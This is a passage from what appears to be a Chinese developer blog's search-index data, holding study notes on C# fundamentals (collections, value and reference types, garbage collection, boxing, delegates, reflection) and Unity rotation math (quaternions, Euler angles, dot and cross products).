类型；所以在存储或检索值类型时通常发生装箱和取消装箱操作。\n只是，在不须要又一次分配时（即最初的容量十分接近列表的最大容量），List&lt; T&gt; 的性能与同类型的数组十分相近。在决定使用 List 还是使用ArrayList 类（两者具有相似的功能）时，记住List 类在大多数情况下运行得更好并且是类型安全的。\n假设对List&lt; T&gt; 类的类型T 使用引用类型，则两个类的行为是全然同样的。可是，假设对类型T使用值类型，则须要考虑实现和装箱问题。\n所以基本不怎么用ArrayList.\n还要注意的一点\n在单线程的时候使用Dictionary更好一些。多线程的时候使用HashTable更好。\n由于HashTable能够通过Hashtable tab &#x3D; Hashtable.Synchronized(new Hashtable());获得线程安全的对象。\n最后贴一个SOF上面的一个关于Dictionary和hashtable的问题…\nWhy is Dictionary preferred over hashtable?\n\n\n\n\n*FWIW, a Dictionary is a hash table.\nIf you meant “why do we use the Dictionary class instead of the Hashtable class?*\n“, then it’s an easy answer: Dictionary is a generic type, Hashtable is not. That means you get type safety with Dictionary, because you can’t insert any random object into it, and you don’t have to cast the values you take out. \n","categories":["dev"],"tags":["unity3d"]},{"title":"C# 知识点总结","url":"/2022/11/08/dev/language/csharp/csharp%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","content":"C# 知识点总结1.引用类型，值类型​       1.1 介绍​        值类型：int，bool，float，char，struct，enum。\n    引用类型：string，object，delegate，interface，class，array。\n\n 1.2 区别\n\n值类型存储在栈中，引用类型存储在堆中。值类型存储快，引用类型存储慢。值类型表示实际数据，引用类型表示指向在内存堆中的指针和引用。值类型在栈中可以自动释放，引用类型在堆中需要GC来释放值类型继承与 System.ValueType，（System.ValueType继承于System.Object)，引用类型继承于System.Object。值类型在栈中存储的是直接的值，引用类型数据本身实在堆中，栈中存放的是一个引用的地址。        1.3 底层        1.引用类型在实例化时，先在栈内开辟空间，用于存储堆中对象的地址，然后在堆内开辟空间，存储引用对象。\n    2.而值类型直接在栈中开辟空间存储对象。值类型也有引用地址，但都在栈内的同一空间。\n\n    3.在参数对象进入方法体内，实则是在栈中开辟了新的临时空间。（也就是参数对象的副本）栈内值类型的修改，由于栈中地址不同，所以值类型不会影响到主体。而引用类型的存储数据是一个堆内的地址，所以对于引用类型的修改是直接修改堆内的对象。\n\n    4.值类型对象中的引用类型在堆中（struct中定义的string等）\n\n    引用类型对象中的值类型也在堆中（class中的int等）\n\n    详细请看：\n\nC# “值类型“和“引用类型“在内存的分配_生产队的驴.的博客-CSDN博客_值类型和引用类型如何分配内存\n2.String引用类型的特殊性​        2.1 介绍​        string的修改，实则是new 一个新的string，在堆内新开辟空间。而此时栈内的副本也会指向堆内新对象。因此string改变。\n    是新建的对象，和本体没有联系。\n\n    2.2 解决\n    当频繁堆一个字符串进行修改时，利用StringBuilder代替String\n\n    2.3 StringBuilder的底层实现？\n    StringBuilder 是支持扩容的（char类型）数组，在每次空间不足时，会开辟一倍的空间（4 -&gt;         8 -&gt; 16...）。 在扩容的期间，会丢弃原数组内的内容，将内容拷贝到新数组。\n\n    2.4 扩展：\n    StringBuffer是线程安全，一般用于多线程\n\n    StringBuilder是非线程安全，所以性能略好，一般用于单线程\n\n    2.5 用StringBuilder拼接字符串就一定比string要好吗？\n    答：不一定，stringbuilder有自身的GC消耗\n\n    极少拼接（或者短字符串）的情况下 String甚至优于StringBuilder，因为String是公用API，通用性好，用途广泛，读取性能高，占用内存较小，Stringbuilder初始化花费时间更大。\n\n    2.6 字符串池\n    字符串池有什么用，原理是什么？\n\n    字符串池是CLR一种针对于反复修改字符串对象的优化措施，作用能够一定程度减少内存消耗。原理是内部开辟容器通过键值对的形式注册字符串对象，键是字符串对象的内容，值是字符串在托管堆上的引用。这样当新创建的时候，会去检查，如果不存在就在这个容器中开辟空间存放字符串。\n\n3. GC    3.1 概念\nunity内部有两个内存管理池:堆内存和栈内存。栈内存(stack)主要用来存储较小的和短暂的数据，堆内存(heap)主要用来存储较大的和存储时间较长的数据。unity中的变量只会在堆栈或者堆内存上进行内存分配，变量要么存储在栈内存上，要么处于堆内存上。\n只要变量处于激活状态，则其占用的内存会被标记为使用状态，则该部分的内存处于被分配的状态。\n一旦变量不再激活，则其所占用的内存不再需要，该部分内存可以被回收到内存池中被再次使用，这样的操作就是内存回收。处于栈上的内存回收及其快速，处于堆上的内存并不是及时回收的，此时其对应的内存依然会被标记为使用状态。不再使用的内存只会在GC的时候才会被回收。\n垃圾回收主要是指堆上的内存分配和回收，unity中会定时对堆内存进行GC操作。\n    3.2 GC算法介绍\n    C#：分代算法，有内存整理，避免碎片化。有压缩。\n\n    0代，未被标记回收的新分配对象\n    \n    1代，上次垃圾回收中没有被回收的对象\n    \n    2代，在一次以上的垃圾回收之后任然没有被回收的对象\n    \n    3.3 简易流程\n    1.GC会检查堆内存上的每个存储变量;\n    \n    2.对每个变量会检测其引用是否处于激活状态;\n    \n    3.如果变量的引用不再处于激活状态，则会被标记为可回收;\n    \n    4.被标记的变量会被移除，其所占有的内存会被回收到堆内存上。\n    \n    3.4 流程详细介绍\n    1.当新建立引用类型对象时，检查0代储存空间是否有充足的空间使得新的引用类型对象存储。若没有，将0代对象进行遍历检查，是否有被调用（激活），没有被调用的对象被标记“可回收”。\n    \n    2.遍历完成后，将所有被“可回收”的对象进行垃圾回收，释放的空间返回给0代储存区，其他的对象的对象 迁移 到1代储存区，标记为“1代对象”，此时该对象是分散分布的，要进行 压缩 操作，使得1代对象顺序紧密排列。新对象存储于0代储存空间，标记为0代对象。\n    \n    3.当1代空间满了时，将1代对象按照上述操作遍历，迁移，压缩到2代储存区，标记为2代对象，同时0代迁移压缩到1代。\n    \n    3.5 GC带来的问题\n    GC在unity内存管理中，会带来以下问题：\n    \n    1.游戏性能：GC操作是一个极其耗费事件的操作，堆内存上的变量或者引用越多则导致遍历检查时的操作变得十分缓慢，使得游戏运行缓慢，例如当CUP处于游戏性能的关键时刻，任何一个操作就会导致游戏帧率下降，造成极大的影响。\n    \n    2.游戏内存：（unityGC采用的是非分代非压缩的标记清除算法）GC操作会产生“内存碎片化”。当一个单元内存从堆中分配出来，其大小取决于存储变量的大小。当内存被回收到堆上时，有可能被堆内存分割成碎片化的单元。（就是说总容量大小时固定的，但是单元内存较小。例如房子很大，房间很小，找不到合适的房间）即下次分配时找不到合适的储存单元，就会触发GC操作，或者堆内存扩容操作，导致GC频发发生和游戏内存越来越大。\n    \n    3.6 何时触发\n    1.在堆内存上进行内存分配操作，而内存不够的时候都会触发垃圾回收来利用闲置的内存;\n    \n    2.GC会自动的触发，不同平台运行频率不—样;\n    \n    3.GC可以被强制执行。\n    \n     3.7 如何避免GC？（装箱拆箱介绍/对象池介绍/泛型介绍）\n    1.减少临时变量的使用，多使用公共对象，多利用缓存机制。（将容器定义到函数外，用到容器的时候进行修改即可）\n    \n    2.减少new对象的次数。\n    \n    3.对于大量字符串拼接时，将StringBuilder代替String。（string不可修改性，修改即创建一个新的string对象，旧的直接抛弃等待GC，但少量字符串拼接用string，性能优于stringbuilder）\n    \n    4.使用扩容的容器时，例如：List，StringBuilder等，定义时尽量根据存储变量的内存大小定义储存空间，减少扩容的操作。（扩容后，旧的容器直接抛弃等待GC）\n    \n    5.代码逻辑优化：例如计时器当大于1s后才进行文本修改，而不是每帧都修改，或者禁止在关键时候GC，影响游戏性能，可以在加载页面或者进度条的时候GC。\n    \n    6.利用对象池：对象池是一种Unity经常用到的内存管理服务，针对经常消失生成的对象，例如子弹，怪物等，作用在于减少创建每个对象的系统开销。在我们想要对象消除时，不直接Destory，而是隐藏起来SetActive（false），放入池子中，当需要再次显示一个新的对象时，先去池子中看有没有隐藏对象，有就取出来（显示） SetActive（true），没有的话，再实例化。\n    \n    7.减少装箱拆箱的操作：\n    \n    7.1装箱拆箱介绍：\n    \n    装箱是将值类型转换为 object 类型或由此值类型实现的任何接口类型的过程。\n    \n    装箱的底层操作：\n    \n    去堆内存new一个Object类对象\n    \n    把值类型的数据存入到堆中的Object对象中\n    \n    将堆上创建的对象的地址返回给引用类型变量。\n    \n    拆箱是从 object 类型到值类型或从接口类型到实现该接口的值类型的显式转换。\n    \n    拆箱底层操作：\n    \n    获取已装箱的对象的地址检查对象实例，以确保它是给定值类型的装箱值。\n    \n    将该值从实例复制到值类型变量中。\n    \n    装箱是将一个 值类型 变量被用于 引用类型 变量的内部转换过程；拆箱 是将创想后的引用类型转回值类型的操作。（无装修即无拆箱）。\n    \n    7.2产生GC的原因：在Unity的装箱操作中，对于值类型会在堆内存上分配一个System.Object类型的引用来封装该值类型变量，其对应的缓存就会产生内存垃圾。装箱操作是非常普遍的一种产生内存垃圾的行为，即使代码中没有直接的对变量进行装箱操作，在插件或者其他的函数中也有可能会产生。最好的解决办法是尽可能的避免或者移除造成装箱操作的代码。\n    \n    7.3泛型介绍：处理多个代码对不同的数据类型执行相同指令的操作。也可以理解为：多个类型共享一组代码。泛型类不是实际的类，而是类的模板。泛型不会进行装箱拆箱，所以性能很 高，且规定了变量类型的限制，编译器可以在一定程度上验证类 型的假设，提高了程序类型的安全性，因此在使用容器时多使用 带有泛型的容器例如（ArrayList与List&lt;int&gt;)。\n    \n    8.协程： yeild return 0 会产生装箱拆箱，可以替换为 yeild return null。\n    \n    9.减少不必要的Log；\n\n4. 面向对象的三大特征：继承、封装、多态    4.1 继承：\n    提高代码重用度，增强软件可维护性的重要手段，符合开闭原则（软件中的对象扩展是开放的，修改是关闭的）。继承就是把子类的公共属性集合起来（变量，方法等）共同管理，这些公共属性设置为父类，C#的继承是单继承，但继承有传递性：A继承B，B继承C，A可以调用C#中的方法。\n\n    4.2 封装：\n　　封装是将数据和行为相结合，通过行为约束代码修改数据的程度，增强数据的安全性，属性是C#封装实现的最好体现。将一些复杂的逻辑包装起来，程序员不管内部是如何实现的，只负责使用里面的数据或者逻辑，目的是保护或者防止代码被无意修改。\n\n    4.3 多态性：\n\n　　多态性是指同名的方法在不同环境下，自适应的反应出不同得表现，是方法动态展示的重要手段。例如叫声，在鸟这个类中是“鸣啼”在狗这个类中是“犬吠”。\n\n5. 修饰符public:对任何类和成员都公开，无限制访问private:仅对该类公开protected:对该类和其派生类公开internal:只能在包含该类的程序集中访问该类      protected internal: protected + internal\n6. 密封类    关键字sealed，类声明时可防止其他类继承此类，在方法中声明则可防止派生类重写此方法。与override一起使用。\n\n详细请看：\n文章https://blog.csdn.net/qq_40323256/article/details/86771078?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=sealed%E7%9A%84%E4%BD%BF%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-86771078.142%5Ev42%5Enew_blog_pos_by_title,185%5Ev2%5Econtrol&amp;spm=1018.2226.3001.4187\n7. 结构体和类 7.1 区别\n 结构体是值类型，类是引用类型。\n 结构体存在栈中，类存在堆中。\n 结构体变量和类对象进行类型传递时,结构体变量进行的就是值传递,而类对象进行的是引用传递，或者说传递的是指针,这样在函数中改变参数值,结构体对象的值是不变的,而类对象的值是变化了。\n 在C#中结构体类型定义时，成员是不能初始化的,这样就导致了，定义结构体变量时,变量的所有成员都要自己赋值初始化。但对于类，在定义类时,就可以初始化其中的成员变量,所以在定义对象时,对象本身就已经有了初始值,你可以自己在重新给个别变量赋值。(注意在C++中，类的定义中是不能初始化的，初始化要放在构造函数中)\n 结构体不能申明无参的构造函数，而类可以。\n 声明了结构类型后，可以使用new运算符创建构造对象，也可以不使用new关键字。如果不使用new，那么在初始化所有字段之前，字段将保持未赋值状态且对象不可用。\n 结构体申明有参构造函数后，无参构造不会被顶掉。\n 结构体不能申明析构函数，而类可以。\n 结构体不能被继承，而类可以。\n 结构体需要在构造函数中初始化所有成员变量，而类随意。\n 结构体不能被静态static修饰(不存在静态结构体)，而类可以。\n 7.2 使用环境\n  结构体：\n\n结构是值类型在栈中，栈的存取速度比堆快，但是容量小，适合轻量级的对象，比如点、矩形、颜色。如果对象时数据集合时，优先考虑接结构体（位置，坐标）在变量传值的时候，希望传递对象的是拷贝，而不是对象的引用地址，这个时候就可以使用结构体。        类：\n   1.类是引用类型，存储在堆中，堆的容量大，适合重量级的对象，栈的空间不大，大量的对应当存在于堆中。\n\n    2.如果对象需要继承和多态特征，用类（玩家、怪物）。\n\n    什么时候用结构呢?\n\n    结构使用简单,并且很有用,但是要牢记:结构在堆栈中创建，是值类型，而类是引用类型。每当需要一种经常使用的类型，而且大多数情况下该类型只是一些数据时，使用结构能比使用类获得更佳性能。\n\n8. 接口和抽象类区别\n接口不是类（无构造函数和析构函数），不能被实例化，抽象类可以间接实例化（可以被继承，有构造函数，可以实例化子类的同时间接实例化抽象类这个父类）。\n接口只能做方法申明，抽象类中可以做方法申明，也可以做方法实现。\n抽象类中可以有实现成员，接口只能包含抽象成员。因此接口是完全抽象，抽象类是部分抽象。\n抽象类要被子类继承，接口要被类实现。\n抽象类中所有的成员修饰符都能使用，接口中的成员都是对外的，所以不需要修饰符修饰。\n接口可以实现多继承，抽象类只能实现单继承，一个类只能继承一个类但可以实现多个接口。\n抽象方法要被实现，所以不能是静态的，也不能是私有的。\n使用环境：\n    使用抽象类是为了代码的复用，而使用接口的动机是为了实现多态性。\n\n    抽象类适合用来定义某个领域的固有属性，也就是本质，接口适合用来定义某个领域的扩展功能。\n\n抽象类\n    1.当2个或多个类中有重复部分的时候，我们可以抽象出来一个基类，如果希望这个基类不能被实例化，就可以把这个基类设计成抽象类。\n\n    2.当需要为一些类提供公共的实现代码时，应优先考虑抽象类。因为抽象类中的非抽象方法可以被子类继承下来，使实现功能的代码更简单。\n\n接口\n    当注重代码的扩展性跟可维护性时，应当优先采用接口。\n\n    ①接口与实现它的类之间可以不存在任何层次关系，接口可以实现毫不相关类的相同行为，比抽象类的使用更加方便灵活;\n\n    ②接口只关心对象之间的交互的方法，而不关心对象所对应的具体类。接口是程序之间的一个协议，比抽象类的使用更安全、清晰。一般使用接口的情况更多。\n\n9. 静态构造函数静态构造函数既没有访问修饰符，也没有参数。在创建第一个类实例或任何静态成员被引用时，.NET将自动调用静态构造函数来初始化类。一个类只能有一个静态构造函数。无参数的构造函数可以与静态构造函数共存。最多只运行一次。静态构造函数不可以被继承。如果没有写静态构造函数，而类中包含带有初始值设定的静态成员，那么编译器会自动生成默认的静态构造函数。如果静态构造函数引发异常，运行时将不会再次调用该构造函数，并且在程序运行所在的应用程序域的生存期内，类型将保持未初始化。\n10. 虚函数实现原理    每个虚函数都会有一个与之对应的虚函数表，该虚函数表的实质是一个指针数组，存放的是每一个对象的虚函数入口地址。对于一个派生类来说，他会继承基类的虚函数表同时增加自己的虚函数入口地址，如果派生类重写了基类的虚函数的话，那么继承过来的虚函数入口地址将被派生类的重写虚函数入口地址替代。那么在程序运行时会发生动态绑定，将父类指针绑定到实例化的对象实现多态。 \n\n11. 指针和引用的区别引用不能为空，即不存在对空对象的引用，指针可以为空，指向空对象。引用必须初始化，指定对哪个对象的引用，指针不需要。引用初始化后不能改变，指针可以改变所指对象的值。引用访问对象是直接访问，指针访问对象是间接访问。引用的大小是所引用对象的大小，指针的大小，是指针本身大小，通常是4字节。引用没有const，指针有const引用和指针的+自增运算符意义不同。引用不需要分配内存空间，指针需要。\n12. ref 与 out    ref和out的作用\n    解决值类型和引用类型在函数内部改值或者重新申明能够影响外部传入的变量让其也被修改。\n\n    使用\n    就是在申明参数的时候前面加上ref和out的关键字即可，传入参数时同上。\n    \n     区别\n    ref传入的变量必须初始化但是在内部可改可不改。\n    \n    out传入的变量不用初始化但是在内部必须修改该值(必须赋值）。\n\n13. 不安全代码与非托管代码    托管代码: 在公共语言运行时(CLR)控制下运行的代码。\n\n    非托管代码: 不在公共语言运行时(CLR)控制下运行的代码。\n    \n    不安全(Unsafe)代码: 不安全代码可以被认为是介于托管代码和非托管代码之间的。不安全代码仍然在公共语言运行时(CLR)控制下运行，但它将允许您直接通过指针访问内存。\n\n14. 委托介绍\n    委托是约束集合中的一个类，而不是一个方法，相当于一组方法列表的引用，可以便捷的使用委托对这个方法集合进行操作。委托是对函数指针的封装。\n\n委托和接口的区别     接口介绍\n    接口是约束类应该具备功能的集合，约束了类应该具备哪些功能，使类从复杂的逻辑中解脱出来，方便类的管理和拓展，同时解决类的单继承问题。\n\n  使用情况\n    接口：无法继承的场所\n\n               完全抽象的场所\n\n               多人协作的场所\n\n    委托：多由于事件的处理\n\n委托和事件的区别        事件可以看做成委托中的一个变量。\n    事件是基于委托的存在，事件是委托的安全包裹 让委托的使用更具有安全性。\n\n委托可以用“&#x3D;”来赋值，事件不可以。委托可以在声明它的类外部进行调用，而事件只能在类的内部进行调用。委托是一个类型，事件修饰的是一个对象。        详细情况：从使用层面上了解委托和事件的区别 - 陈哈哈 - 博客园\n15. C#中基本类型占用的字节数类型\n字节数\nbool -&gt; System.Boolean\n布尔型，其值为 true 或者 false\nbyte -&gt; System.Byte\n字节型，占 1 字节，表示 8 位正整数，范围 0 ~ 255\nsbyte -&gt; System.SByte\n带符号字节型，占 1 字节，表示 8 位整数，范围 -128 ~ 127\nchar -&gt; System.Char\n字符型，占有两个字节，表示 1 个 Unicode 字符\nshort -&gt; System.Int16\n短整型，占 2 字节，表示 16 位整数，范围 -32,768 ~ 32,767\nushort -&gt; System.UInt16\n无符号短整型，占 2 字节，表示 16 位正整数，范围 0 ~ 65,535\nuint -&gt; System.UInt32\n无符号整型，占 4 字节，表示 32 位正整数，范围 0 ~ 4,294,967,295\nint -&gt; System.Int32\n整型，占 4 字节，表示 32 位整数，范围 -2,147,483,648 到 2,147,483,647\nfloat -&gt; System.Single\n单精度浮点型，占 4 个字节\nulong -&gt; System.UInt64\n无符号长整型，占 8 字节，表示 64 位正整数，范围 0 ~ 大约 10 的 20 次方\nlong -&gt; System.Int64\n长整型，占 8 字节，表示 64 位整数，范围大约 -(10 的 19) 次方 到 10 的 19 次方\ndouble -&gt; System.Double\n双精度浮点型，占8 个字节\n    特殊：bool：true/false\n\n    1：byte、char\n\n    2：char、short\n\n    4：int，float\n\n    8：long、double\n\n16. New的实现    rPoint1 = new RefPoint(1);\n\n在应用程序堆上创建一个引用类型对象的实例，并为它分配内存地址。自动传递该实例的引用给构造函数(正因如此，在构造函数中才能使用this来访问这个实例)。调用该类型的构造函数。返回该实例的引用内存地址，复制给 rPoint1 变量，该rPoint1 引用对象保存的数据是指向在堆上创建该类型的实例地址。\n17. 协变与逆变    协变(out):\n    和谐、自然的变化\n\n    里式替换原则中，父类容器可以装载子类对象，子类可以转换成父类。比如string转object，感受是和谐的。\n    \n    逆变(in):\n    逆常规、不正常的变化\n    \n    里式替换原则中，父类容器可以装载子类对象，但是子类对象不能装载父类。所以父类转换为子类，比如object转string，感受是不和谐的。\n    \n    协变和逆变是用来修饰泛型的，用于泛型中修饰字母，只有泛型接口和泛型委托能使用.\n\n  作用:\n\n&#x2F;&#x2F;1.返回值与参数\n&#x2F;&#x2F;用out修饰的泛型，只能作为返回值\ndelegate T Testout();\n&#x2F;&#x2F;用in修饰的泛型，只能作为参数\ndelegate T TestIn(T t);\n18. 反射    可以在加载程序运行时，动态获取和加载程序集，并且可以获取到程序集的信息反射即在运行期动态获取类、对象、方法、对象数据等的—种重要手段。\n\n 反射面向对象体现\n\n    之前了解的面向对象是基于类实现，而反射中就是基于程序集实现，只不过把类再用程序集包裹了一下，封装是把一些属性方法封装到一个类中，限制其数据修改的程度，那多加一层皮(程序集 ) 就是一个道理了，继承多态就是和类一样，把类换成程序集去理解。\n\n优点：\n    允许在运行时发现并使用编译时还不了解的类型以及成员。\n\n缺点：\n    1.根据目标类型的字符串搜索扫描程序集的元数据的过程耗时。\n\n    2.反射调用方法或属性比较耗时。（首先必须将实参打包成数组，在内部，反射必须将这些实参解包到线程栈上。可以使用多态避免反射操作）\n\n通过反射去获取对象的一个实例\n\n    反射可以直接访问类的构造，直接通过getConstructor，去访问这个构造函数，然后通过不同的参数列表，就可以具体的定位到哪一个构造的重载，通过这个方法，去得到类的实例，把对象就拿到了。\n\n19. 想要在for循环中删除List（或者vector，都行）中的元素时，有可能出现什么问题，如何避免？    当删除遍历节点后面的节点时，会导致List.Count进行变化，删除元素后，当根据i++，遍历到删除的节点会发生异常。\n\n    处理\n    \n    可以从后往前元素元素，即删除在访问的前面\n\n20. 有两个敌人我用敌人A实例化了一个实体，我直接用B&#x3D;A，请问会导致什么问题    原理：两个引用指向内存中同一份数据。\n\n    实际游戏场景中，首先的问题就是A掉血 B也会掉血，并且最大的问题是A死了一般情况是要删除，那么B引用会报空，可能出现未知的错误。\n\nrefhttps://blog.csdn.net/Sea3752/article/details/127354146 \n","categories":["language"],"tags":["csharp"]},{"title":"Unity3d中的旋转研究","url":"/2022/11/07/dev/game/u3d/Unity3d%E4%B8%AD%E7%9A%84%E6%97%8B%E8%BD%AC%E7%A0%94%E7%A9%B6/","content":"Unity3d中的旋转研究四元数与欧拉角1.1 四元数概念     四元数（以后不特指四元数&#x3D;单位四元数）是四维空间中一个超球上面的点，满足w²+x²+y²+z²&#x3D;1；而纯四元数是四维空间在w&#x3D;0时的一个子空间的点，形式为{0, q}，特别注意的是纯四元数与四元数是不同的概念。\n四元数是复数虚部扩展的结果，复数的虚部为1个，而四元数虚部有3个，且两两互相正交，其中实部是cosθ/2，而虚部为一个単位轴乘以sinθ/2。四元数自由度并没有四个维度，由于存在w²+x²+y²+z²=1这个约束，它的自由度其实只有3，且每个四元数可以对应一个特征向量，即n。\n\n四元数Quaternion的作用\n    表示旋转，因此旋转角度计算时用到四元数。\n    详细请看：\n\n【Unity编程】Unity中关于四元数的API详解 - AndrewFan - 博客园本文总结了Unity中关于Quaternion（四元数）的API使用方法以及给出部分示例。https://www.cnblogs.com/driftingclouds/p/6626183.html\n欧拉角概念    欧拉角是由三个角组成，这三个角分别是Yaw,Pitch,Roll。很难翻译这三个单词，Yaw 表示绕y轴旋转的角度，Pitch表示绕x轴旋转的角度，Roll表示绕z轴旋转的角度。也就是说，任意的旋转角度都可以通过这三次按照先后顺序旋转得到。矩阵很难让人具体形象表示，欧拉角就容易多了。注意可能很多地方三个角的先后次序不一样。\n\n1.3 四元数对于欧拉角的优点避免万向节死锁两个四元数之间更容易插值能进行增量旋转给定方位的表达式有两种，互为负。1.4 欧拉角的万向节死锁        我们依次绕物体坐标系的X轴、Y轴、Z轴旋转,当Y轴旋转了90度之后,Z就会指向原来的X轴。这样一来,我们事实上只绕了X轴和Y轴两个轴旋转,第三根轴的自由度就丢失了。\n    详细请看：\n\n欧拉角万向节死锁 - 知乎目录1.欧拉角2.万向节死锁—-2.1 什么是Gimbal —-2.2 Pitch、Yaw、Roll—-2.3 万向节死锁——–2.3.1 横滚——–2.3.2 俯仰——–2.3.3 偏航——–2.3.4 死锁的产生——–2.3.5 重现万向节死锁问题…https://zhuanlan.zhihu.com/p/344050856\n\n点乘概念\n 点乘，也叫向量的内积、数量积。\n\n 描述了两个向量的相似程度，结果越大两向量越相似，还可表示投影。\n\n\n\n计算方式\n    向量a·向量b=|a||b|cos&lt;a,b&gt;\n\n求两个向量的夹角（用单位向量） \n\n叉乘概念\n 叉乘，也叫向量的外积、向量积，得到的向量垂直于原来的两个向量。\n\n\n\n计算方式\n    |向量c|=|向量a×向量b|=|a||b|sin&lt;a,b&gt;\n\n    A×B = -B×A\n\n    这里点乘叉乘只记录了几何角度，详细请看：\n\n向量的点乘和叉乘区别及几何意义https://baijiahao.baidu.com/s?id=1736495807922098016&amp;wfr=spider&amp;for=pc\n    详细请看：\n\nUnity 点乘和叉乘的原理和使用_PassionY的博客-CSDN博客_点乘和叉乘运算法则Unity当中经常会用到向量的运算来计算目标的方位，朝向，角度等相关数据，下面咱们来通过实例学习下Unity当中最常用的点乘和叉乘的使用。点乘 （又称”点积”,”数量积”,”内积”）（Dot Product, 用＊）定义：a·b&#x3D;|a|·|b|cos 【注：粗体小写字母表示向量，表示向量a,b的夹角，取值范围为[0，180]】几何意义：是一条边向另一条边的投影乘以另一条边的长度.https://blog.csdn.net/yupu56/article/details/53609028\n\n向量归一化向量归一化即将向量的方向保持不变，大小归一化到1。\n\n判断一个点在矩形内外详细请看：\n\n\n判断点是否在一个矩形内_faithmy509的博客-CSDN博客_如何判断一个点是否在矩形内可以用叉乘或点乘的方式来判断。代码：class Point: def init(self, x, y): self.x &#x3D; x self.y &#x3D; ydef GetCross(p1,p2,p): return (p2.x-p1.x)(p.y-p1.y)-(p.x-p1.x)(p2.y-p1.y)def GetDot(p…https://blog.csdn.net/faithmy509/article/details/82803646\n\n判断一个点在三角形内外1.面积法  求三角形面积的方法就可以用上面提到的利用叉积就行了，注意记得加 上绝对值，因为叉积可能为负。还有种简单的方法是利用内角和为 180 ° 2.同侧法 若点P在点A、B、C内，则ABXAP，BCxBP,CAxCP结果都为正(负)，则可以认为P在A、B、C内，若任意一个结果不同则P在ABC外。（因为正负看的sin夹角的大小，在两个夹角小于90°的情况下，“右手定则”来判定，即右手向第二个因数弯曲，看大拇指是否改变，同向为正，异向为负。）\n\n判断一个对象B在对象A的前后左右（点乘叉乘应用）点乘前后，叉乘左右。\n\n\n7.1前后判断\n 生成两个向量：\n对象A自身为原点，指向面向前方的方向。对象A自身为原点，指向对象B的方向。     两个向量点乘，正为B在A的前方，负为B在A的后方，0为左右两侧。\n（点乘正负看向量夹角，小于90°为正，大于90°则为负，等于90°正为水平两侧）\n7.2左右判断        向量A 叉乘 向量B，结果为正，B在A的左侧，结果为负，B在A的右侧。\n（注意：Unity当中使用左手，因为Unity使用的是左手坐标系，叉乘方向相反）\n假设向量A和B 都在xz平面上\n向量A叉乘向量B\ny大于0 证明B在A右侧\ny小于0 证明B在A左侧\nref：https://blog.csdn.net/Sea3752/article/details/127718438\nQuaternion类Quaternion（四元数）用于计算Unity旋转。它们计算紧凑高效，不受万向节锁的困扰，并且可以很方便快速地进行球面插值。 Unity内部使用四元数来表示所有的旋转。\nQuaternion是基于复数，并不容易直观地理解。 不过你几乎不需要访问或修改单个四元数参数（x，y，z，w）; 大多数情况下，你只需要获取和使用现有的旋转（例如来自“Transform”），或者用四元数来构造新的旋转（例如，在两次旋转之间平滑插入）。大部分情况下，你可能会使用到这些函数：\n\nQuaternion.LookRotation，\nQuaternion.Angle\nQuaternion.Euler\nQuaternion.Slerp\nQuaternion.FromToRotation\nQuaternion.identity。\n\nQuaternion 是一个结构体，本身成员变量相对简单，可以作为函数参数高效传递。\nUnity默认方向在深入了解API之前，我们需要先明确一些基本的概念，就是方向、旋转究竟是如何表示的。Unity中使用左手坐标系，假如把世界坐标系跟东南西北进行结合起来看，大致如下图所示：\n默认的方向对应如下表：\n\n\n\n坐标轴\n对应方向\n\n\n\n+x\n右(东)\n\n\n-x\n左(西)\n\n\n+y\n上\n\n\n-y\n下\n\n\n+Z\n前(北)\n\n\n-Z\n后(南)\n\n\n假设以你自己身体为例，你站立在地面上，面朝北方，此时就是默认方向，也就是Unity中的方向就是面向+Z轴方向，那么此时+X轴在东方，+Y轴对应正上方。此时对应的欧拉角是(0,0,0),此时对应的前方矢量是(0,0,1)，上方矢量是(0,1,0)。\n这里我区分了左右上下前后的概念，因为这些概念同时也对应了Vector3类、Transform类中的相应的方向函数。\n方向的表示法①欧拉角表示法假如你使用一组欧拉角表示旋转,XYZ三个参数代表相应轴向按照顺归YZX的旋转，因此(0、90、90)代表先进行+Z轴旋转90度，再沿着+Y轴进行90度旋转，更多详细内容可以参考前述文章《【Unity编程】Unity中的欧拉旋转》。\n②前方上方矢量界定法编程过程中，大部分需要明确指定方位的时候就需要使用这个方法。要确定一个朝向，我们可以使用两个向量来确定：即前方矢量和上方矢量。当一个朝向的前方和上方确定之后，这个朝向也就完全确定了。举例来说，如果现在只提供一个朝向，就是你现在面朝北方，那么这个方向已经完全确定了吗？显然没有。因为你右侧躺在地上，看向北方，还是在面朝北方，这时候就需要另外一个矢量，也就是上方。当给出上方之后，这个朝向就完全确定了。\n上方需要严格给出吗？在Unity中，我们很多时候，不需要给出严格的上方朝向。比如，仍然是上面那个例子，如果我面朝北方，先给出(0,0,1)代表我的前方矢量。那么，如果我给出的方向不是严格的上方矢量，比如是(0,0.5,0.5)，是否可以？答案也是可以的，因为这两个矢量显然已经确定了一个方向，前方是严格的，而实际的上方可以通过前方朝着你给出的上方矢量旋转90度得出。也就是说，你给(0,1,0)作为上方矢量，和给出在下图中弧度范围内(不包含+Z和-Z)所有方向的矢量都是相同的结果。\n\n③绕轴旋转界定法第三种定义旋转的方法就是围绕某个指定的轴向旋转一定的角度。这个方法也可以确定一个相对旋转，它以从默认方向(此时前方+Z，上方+Y)出发，沿着指定的轴向进行指定角度的旋转，旋转后的前方和上方是确定的。因此这个方法也可以用来确定朝向。\n④A向到B向相对旋转表示法还有一种方法就是从A向到B向的相对旋转，这种表示了一个旋转的相对变化。比如A为(0,1,0)，B为(0,0,1)，也就是相对旋转量代表原来的上方被旋转到了前方，这样的一个四元数也可以用欧拉角表示成(90,0,0)，也就是沿着+X轴旋转了90度。\n注意上面四中表示方法中，有的明确表明了上方矢量，有的好像只明确了前方矢量，要明确的一点就是，它们都是从默认矢量出发的，如果没有明确指定上方朝向，那么就是使用默认的上方，也就是+Y方向。\n成员变量\neulerAngles 欧拉角，返回当前四元数所对应的欧拉角\nthis[int] 可以使用类似数组和下标的形式从四元数中获取四个四元数参数\nx、y、z、w 分别代表x、y、z、w 参数，具体代表的内容可以参考前文《【Unity编程】四元数(Quaternion)与欧拉角》，你最好不要通过修改四个参数来改变四元数，除非你真的非常了解它们的含义。\n\n静态成员\nidentity 单位四元数，也就是默认的无旋转状态，此时与世界坐标相同，前方指向+Z，上方指向+Y\n\n成员函数\n\n\n函数形式\n解释\n\n\n\nvoid Set(float new_x, float new_y, float new_z, float new_w)\n设置x、y、z、w 